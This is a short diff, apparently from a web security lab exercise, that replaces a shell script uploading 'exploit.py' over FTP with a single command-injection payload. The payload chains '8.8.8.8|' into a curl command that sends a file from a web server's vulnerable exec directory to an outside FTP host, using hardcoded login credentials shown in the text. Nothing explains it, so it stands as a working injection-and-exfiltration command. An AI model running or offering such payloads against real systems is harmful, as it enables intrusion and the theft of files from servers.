@@ -1,15 +1,1 @@
-#!/bin/sh
-HOST='ftp.dlptest.com'
-USER='dlpuser'
-PASSWD='rNrKYTX9g7z3RgJRmxWuGHbeu'
-FILE='exploit.py'
-
-ftp -n $HOST <<END_SCRIPT
-quote USER $USER
-quote PASS $PASSWD
-put $FILE
-quit
-END_SCRIPT
-exit 0
-
-{"mode":"full","isActive":false}
+8.8.8.8| curl -p - --insecure  "ftp://ftp.dlptest.com/tp/" --user "dlpuser:rNrKYTX9g7z3RgJRmxWuGHbeu" -T "/var/www/html/vulnerabilities/exec/exploit.py" --ftp-create-dirs
